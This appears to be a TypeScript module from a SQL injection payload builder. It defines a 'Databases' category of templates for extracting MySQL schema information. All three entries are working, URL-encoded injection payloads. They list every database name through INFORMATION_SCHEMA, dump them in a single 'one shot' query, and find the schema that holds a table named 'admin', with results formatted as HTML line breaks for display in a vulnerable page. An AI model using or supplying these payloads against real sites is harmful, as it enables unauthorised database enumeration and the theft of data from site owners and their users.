import { BuilderSubcategory } from '../../types';

export const databaseSubcategory: BuilderSubcategory = {
  id: 'database',
  label: 'Databases',
  description: 'Database schema extraction templates',
  templates: [
    {
      id: 'db-names-group-concat',
      name: 'DATABASE_NAMES group_concat()',
      content: '(SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA)'
    },
    {
      id: 'db-names-one-shot',
      name: 'DATABASE_NAMES one shot',
      content: '(SELECT+(@x)+FROM+(SELECT+(@x:=0x00),(@NR_DB:=0),(SELECT+(0)+FROM+(INFORMATION_SCHEMA.SCHEMATA)+WHERE+(@x)+IN+(@x:=CONCAT(@x,LPAD(@NR_DB:=@NR_DB%2b1,2,0x30),0x20203a2020,schema_name,0x3c62723e))))x)'
    },
    {
      id: 'db-name-from-table-name',
      name: 'DATABASE_NAME Frm Table Name',
      content: "(select group_Concat(0x3c62723e,table_schema) from {f information_schema.tables} where table_name = 'admin')"
    }
  ]
};
